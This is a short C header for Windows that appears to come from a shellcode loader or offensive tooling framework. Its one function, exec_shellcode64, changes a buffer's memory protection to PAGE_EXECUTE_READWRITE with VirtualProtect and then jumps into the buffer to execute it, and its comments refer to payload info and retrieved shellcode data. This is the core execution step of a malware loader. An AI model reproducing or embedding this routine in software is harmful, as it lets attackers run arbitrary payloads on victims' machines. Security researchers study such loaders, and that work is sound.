#pragma once

#include <stdio.h>
#include <windows.h>
#include "../debug_print/debug_print.h"


// Currently ignores payload_info
// Requires shellcode_size for VirtualProtect call
void exec_shellcode64(unsigned char *shellcode, int shellcode_size, char *payload_info) {
	DEBUG_PRINT("exec_shellcode64 called\n");	
	DEBUG_PRINT("Shellcode size: %d\n", shellcode_size);
	
    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    DWORD l = 0;
	    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE_READWRITE, &l);
	    (* (int(*)()) shellcode)();
    }
}
